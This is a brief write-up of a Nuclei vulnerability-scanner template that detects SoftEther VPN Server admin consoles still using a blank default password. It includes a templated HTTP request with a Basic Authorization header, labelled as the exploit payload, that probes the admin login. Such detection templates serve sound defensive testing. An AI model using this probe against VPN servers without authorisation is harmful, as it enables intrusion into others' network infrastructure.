# Nuclei Template: SoftEther VPN Admin Console - Default Login
**Template ID:** softether-vpn-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`softether-vpn-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The administrative password for the SoftEther VPN Server is blank.

## Steps to reproduce / Exploit Payload
```http
GET /admin/default/ HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

## References
- https://www.softether.org/4-docs/1-manual/3._SoftEther_VPN_Server_Manual/3.3_VPN_Server_Administration#Administration_Authority_for_the_Entire_SoftEther_VPN_Server
